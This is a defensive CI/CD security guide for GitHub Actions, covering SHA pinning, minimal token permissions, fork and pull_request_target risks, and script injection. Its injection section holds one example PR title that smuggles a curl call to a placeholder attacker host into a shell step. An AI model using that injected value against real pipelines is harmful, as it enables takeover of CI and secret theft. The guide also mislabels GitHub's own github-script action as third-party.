# Sentinel PR Audit — CI/CD Security Guide

## Supply Chain Risks of Third-Party Actions

Running a third-party GitHub Action in your CI/CD pipeline gives that action the same privileges as your workflow. A compromised action can:

- **Steal `GITHUB_TOKEN`** — Read from disk or git credential helpers. With `pull-requests: write` or `contents: write`, an attacker can modify releases, approve PRs, or push code.
- **Exfiltrate secrets** — Read all environment variables and cloud metadata endpoints (IMDS), then POST them to an attacker-controlled server.
- **Modify builds** — Inject backdoors into compiled artifacts, Docker images, or signed releases.
- **Pivot to other repos** — Use stolen tokens to compromise additional repositories and services.

### Real-world incidents

- **`tj-actions/changed-files` (2025)** — Compromised via a maintainer's PAT. All consumers of `@v3` received malicious code.
- **Trivy release tags (2024)** — Attacker force-pushed malicious commits to 76 of 77 release tags. All users pinning to `@v0.24.0` received the payload.
- **HackerBot/CLAW campaign** — Automated injection of malicious code into CI pipelines via compromised npm packages in CI scripts.

## Why Sentinel Uses Only First-Party Actions

The Sentinel PR Audit workflow (`sentinel-pr-audit.yml`) uses exactly two actions:

| Action | SHA Pinned | Source |
|--------|-----------|--------|
| `actions/checkout@11bd719...` | Yes | GitHub official |
| `actions/setup-node@cdca736...` | Yes | GitHub official |

Everything else (installing sentinel, fetching the diff, scanning, posting the comment, creating the check run) is done via the `gh` CLI that GitHub's runner includes natively. No third-party JavaScript actions, no Docker actions, no composite actions that install packages from untrusted registries.

### What We Avoid

| Common Practice | Why Sentinel Avoids It |
|----------------|----------------------|
| `actions/github-script@v7` | Third-party action that downloads and runs Node code at runtime |
| `@v1` version tags | Mutable — can be force-pushed by maintainer or attacker |
| `pull_request_target` | Runs in privileged context with full secrets access |
| Unpinned composite actions | Any action that runs `npm install` could pull typosquatted dependencies |
| Inline `${{ }}` in shell blocks | Script injection via PR title, branch name, or body |

## Best Practices for Your CI/CD

### 1. Pin All Actions by SHA

```yaml
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

A SHA reference is **immutable**. A tag like `@v4` can be force-pushed. If the SHA becomes untrusted, the build breaks — you notice immediately.

To update a pinned action, change the SHA and verify the new code before committing.

### 2. Set Minimal Permissions

```yaml
permissions:
  contents: read
  pull-requests: write
  checks: write
```

Never use `permissions: write-all`. Grant only the scopes the workflow needs. For PR audit:
- `contents: read` — Checkout the code
- `pull-requests: write` — Post the audit comment
- `checks: write` — Create the Check Run

### 3. Use `pull_request`, Not `pull_request_target`

`pull_request` runs with a **read-only** `GITHUB_TOKEN` and no access to repository secrets. `pull_request_target` runs in the base repository context with full write access — if an attacker opens a PR with malicious code and the workflow checks out their fork, the attacker controls the CI environment.

Sentinel's workflow uses `pull_request` exclusively. The `GITHUB_TOKEN` is restricted to what we need: commenting on PRs and creating check runs.

### 4. Prevent Script Injection

Never use `${{ }}` expressions directly in `run:` blocks:

```yaml
# DANGEROUS — attacker can set PR title to: a"; curl http://attacker.com; echo "
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE — uses env indirection
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

GitHub interpolates `${{ }}` before the shell executes, creating injection opportunities. Using `env:` indirection shells properly escapes the value.

### 5. Fork Awareness

Anyone can fork a public repo and modify its workflows. If you use `pull_request_target`, a forked PR executes code in **your** CI context. Always:

- Require approval for first-time contributors (GitHub repo setting)
- Never check out PR code in a `pull_request_target` workflow
- Verify that forked PR workflow runs use `pull_request`, not `pull_request_target`

### 6. Use Trusted Publishing (OIDC)

Wherever possible, replace static secrets with OpenID Connect (OIDC) trusted publishing. OIDC tokens are short-lived, scoped to individual deployments, and don't require shared secrets.

## Sentinel Action Integrity

Because Sentinel is a **security tool that runs in CI**, its own supply chain is critical. If an attacker compromises the Sentinel Action, they can:

1. Modify scan rules to hide malicious code in their PRs
2. Change the verdict logic to always return `PASS`
3. Suppress evidence in PR comments
4. Steal `GITHUB_TOKEN` and exfiltrate it

### Mitigations Built Into Sentinel

- **SHA-pinned actions** — All upstream actions are pinned by SHA, not tag
- **No third-party actions** — Only `actions/checkout` and `actions/setup-node`
- **`gh` CLI only** — No npm packages installed at runtime beyond sentinel itself
- **Read-only token** — `contents: read` prevents the workflow from pushing code
- **Deterministic scanning** — Sentinel's SAST rules are local and cannot be modified by the workflow

### What You Should Do

- **Pin Sentinel's action by SHA** — Don't use `@v4` or `@latest`. Fork the repo and reference your fork's commit SHA after auditing the code.
- **Review before updating** — Before updating the pinned SHA, review the diff between versions.
- **Audit the workflow** — Review `.github/workflows/sentinel-pr-audit.yml` and `.github/actions/sentinel-pr-audit/action.yml` for any unexpected changes.
- **Enable Dependabot for Actions** — Get notified of updates, but review and test before merging.
- **Use CODEOWNERS** — Require security team approval for changes to `.github/workflows/` and `.github/actions/`.

## Summary

| Risk | Sentinel Mitigation |
|------|-------------------|
| Compromised third-party action | Only 2 first-party actions, both SHA-pinned |
| Script injection | PR metadata passed via `env:` indirection |
| Forked PR exploits | Uses `pull_request` (read-only token) |
| Mutable version tags | All actions pinned to immutable SHAs |
| Dependency confusion | No `npm install` in the action itself |
| Token exfiltration | Minimal permissions, `persist-credentials: false` |

---

_Questions? Open an issue at https://github.com/anomalyco/opencode/issues_
